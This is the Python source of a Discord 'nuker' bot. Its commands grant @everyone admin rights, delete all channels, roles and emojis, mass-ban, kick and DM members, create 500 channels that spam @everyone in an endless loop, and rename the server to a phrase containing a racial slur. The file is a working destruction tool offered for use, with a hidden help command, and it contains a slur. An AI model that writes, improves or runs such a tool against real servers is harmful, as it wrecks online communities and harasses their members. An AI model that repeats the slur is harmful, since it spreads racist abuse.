import discord
from discord.ext import commands
from colorama import Fore
import os
import random

logo = Fore.RED + """
███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
"""

bot = commands.Bot(comamnd_prefix="$", intents=discord.Intents.all())

SPAM_CHANNEL = ["get-nuked", "get-wizzed"]
SPAM_MESSAGE = ["GOT DESTROYED", "EZ"]
YOUR_ID = "id here"
SPAM_CHANNEL_AMOUNT = 500
TOKEN = "discord bot token here"
GUILD_NAME = "GOT NUKED NIGGAS"

@bot.event
async def on_ready():
    os.system("cls")
    os.system("title Nuker by middas33")
    print(logo + Fore.RESET)
    print(Fore.WHITE + "----------------------" + Fore.RESET)
    print(Fore.RED + "Made by middas33")
    print(f">> Bot has been runned")

@bot.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send("@everyone" + " " + random.choice(SPAM_MESSAGE))

@bot.command()
async def nuke(ctx : commands.Context):
    await ctx.message.delete()
    guild = ctx.guild
    
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions = discord.Permissions.all())
        print(Fore.RED + ">> I given everyone admin" + Fore.RESET)
    except:
        print(Fore.RED + ">> I can't give everyone admin" + Fore.RESET)
    
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.RED + f">> Channel {channel.name} got removed" + Fore.RESET)
        except:
            print(Fore.RED + f">> Channel {channel.name} didn't got removed" + Fore.RESET)
    
    for member in guild.members:
        try:
            if member.id == YOUR_ID:
                continue
            else:
                embed = discord.Embed(title=f"This is why you shouldn't give random people admin",
                description="Yep this is kinda sad, but why people don't secure their servers",
                color=discord.Color.blurple()
                )
                embed.add_field(name="Github", value="https://github.com/middas33", inline=True)
                embed.set_thumbnail(url="https://i.imgur.com/EfXWIzn.png")

                await member.send(embed=embed)
                await member.ban()
                print(Fore.RED + f">> Member {member.name}#{member.discriminator} recieved message and got banned" + Fore.RESET)
        except:
            print(Fore.RED + f">> Member {member.name}#{member.discriminator} didn't recieved message and did not get banned" + Fore.RESET)

    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.RED + f">> Role {role.name} got removed" + Fore.RESET)
        except:
            print(Fore.RED + f">> Role {role.name} didn't got removed" + Fore.RESET)
    
    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
            print(Fore.RED + f">> Emoji {emoji.name} got removed" + Fore.RESET)
        except:
            print(Fore.RED + f">> Emoji {emoji.name} didn't got removed" + Fore.RESET)

    for i in range(SPAM_CHANNEL_AMOUNT):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))

    await guild.edit(name=GUILD_NAME)

    print(Fore.RED + "Nuke done!")

@bot.command()
async def ball(ctx : commands.Context):
    await ctx.message.delete()
    guild = ctx.guild
    for member in guild.members:
        try:
            if member.id == YOUR_ID:
                continue
            else:
                
                await member.ban()
                print(Fore.RED + f">> Member {member.name}#{member.discriminator}  got banned" + Fore.RESET)
        except:
            print(Fore.RED + f">> Member {member.name}#{member.discriminator} didn't get banned" + Fore.RESET)

@bot.command()
async def kall(ctx : commands.Context):
    await ctx.message.delete()
    guild = ctx.guild
    for member in guild.members:
        try:
            if member.id == YOUR_ID:
                continue
            else:
                
                await member.kick()
                print(Fore.RED + f">> Member {member.name}#{member.discriminator}  got banned" + Fore.RESET)
        except:
            print(Fore.RED + f">> Member {member.name}#{member.discriminator} didn't get banned" + Fore.RESET)

@bot.command()
async def mall(ctx : commands.Context):
    await ctx.message.delete()
    guild = ctx.guild
    for member in guild.members:
        try:
            if member.id == YOUR_ID:
                continue
            else:
                embed = discord.Embed(title=f"This is why you shouldn't give random people admin",
                description="Yep this is kinda sad, but why people don't secure their servers",
                color=discord.Color.blurple()
                )
                embed.add_field(name="Github", value="https://github.com/middas33", inline=True)
                embed.set_thumbnail(url="https://i.imgur.com/EfXWIzn.png")

                await member.send(embed=embed)
                
                print(Fore.RED + f">> Member {member.name}#{member.discriminator} recieved message" + Fore.RESET)
        except:
            print(Fore.RED + f">> Member {member.name}#{member.discriminator} didn't recieved message" + Fore.RESET)

@bot.command()
async def remove(ctx : commands.Context):
    await ctx.message.delete()
    guild = ctx.guild
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.RED + f">> Role {role.name} got removed" + Fore.RESET)
        except:
            print(Fore.RED + f">> Role {role.name} didn't got removed" + Fore.RESET)
    
    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
            print(Fore.RED + f">> Emoji {emoji.name} got removed" + Fore.RESET)
        except:
            print(Fore.RED + f">> Emoji {emoji.name} didn't got removed" + Fore.RESET)

    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.RED + f">> Channel {channel.name} got removed" + Fore.RESET)
        except:
            print(Fore.RED + f">> Channel {channel.name} didn't got removed" + Fore.RESET)

@bot.command()
async def admin(ctx : commands.Context):
    await ctx.message.delete()
    guild = ctx.guild

    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions = discord.Permissions.all())
        print(Fore.RED + ">> I given everyone admin" + Fore.RESET)
    except:
        print(Fore.RED + ">> I can't give everyone admin" + Fore.RESET)

@bot.command()
async def rall(ctx : commands.Context, *, rename_to = None):
    await ctx.message.delete()
    if rename_to == None:
        rename_to == "https://github.com/middas33"
    
    for member in list(bot.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print(Fore.RED + f">> Renamed {member.id} to {rename_to}" + Fore.RESET)
        except:
            print(Fore.RED + f">> Failed to rename {member.id} to {rename_to}" + Fore.RESET)

@bot.command()
async def sercet(ctx : commands.Context):
    await ctx.message.delete()
    embed = discord.Embed(title=f"Help with a nuker", color=discord.Color.blue())
    embed.add_field(name="$nuke", value="Start destruction", inline=True)
    embed.add_field(name="$ball", value="Ban all members", inline=True)
    embed.add_field(name="$kall", value="Kick all members", inline=True)
    embed.add_field(name="$rall <rename_to>", value="Rename all members", inline=True)
    embed.add_field(name="$mall", value="Sends message to all members", inline=True)
    embed.add_field(name="$remove", value="Remove all channels, roles, emojis", inline=True)
    embed.add_field(name="$admin", value="Give @everyone admin perms", inline=True)
    return await ctx.author.send(embed=embed)


bot.run(TOKEN)
